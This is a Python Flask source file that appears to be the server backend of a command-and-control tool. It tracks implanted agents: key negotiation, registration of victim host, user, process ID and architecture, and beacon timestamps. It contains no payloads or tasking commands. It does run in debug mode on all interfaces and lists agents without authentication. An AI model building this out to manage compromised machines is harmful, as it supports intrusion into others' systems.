from flask import *
from pymongo import MongoClient
from base64 import b64decode
from datetime import datetime
from bson import json_util

import sarla.src.server.common.authentication as auth

app = Flask(__name__)

client = MongoClient("localhost", 27017)

db = client.sarla
agents = db.agents


def run():
    app.run(debug=True, host="0.0.0.0")


def strip(data):
    try:
        data = str(b64decode(data))
        data = data.rstrip("'")
        data = data.lstrip("b'")

        return data
    except:
        print("Error stripping POST data")


@app.route("/api/register", methods=["POST"])
def register():
    if request.method == "POST":
        plaintext = strip(request.data)

        data = plaintext.split(",")

        key = data[0]

        filter = {"key": key}

        values = {
            "$set": {
                "host": data[1],
                "user": data[2],
                "pid": data[3],
                "name": data[4],
                "arch": data[5],
                "beacon": datetime.now().strftime("%H:%M:%S"),
            }
        }

        agents.update_one(filter, values)

        return "response"


@app.route("/api/negotiate", methods=["POST"])
def negotiate():
    if request.method == "POST":
        plaintext = strip(request.data)

        if str(plaintext) == auth.keyword:
            id = auth.generate_id()
            key = auth.generate_key(plaintext)
            agents.insert_one({"id": id, "key": key})

            return key


@app.route("/api/beacon", methods=["POST"])
def beacon():
    plaintext = strip(request.data)

    data = plaintext.split(",")

    key = data[0]

    filter = {"key": key}

    values = {"$set": {"beacon": datetime.now().strftime("%H:%M:%S")}}

    agents.update_one(filter, values)

    return "response"


@app.route("/api/client/agents")
def get():
    r = agents.find()
    l = list(r)
    return json.loads(json_util.dumps(l))


@app.route("/")
def index():
    return render_template("index.html")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
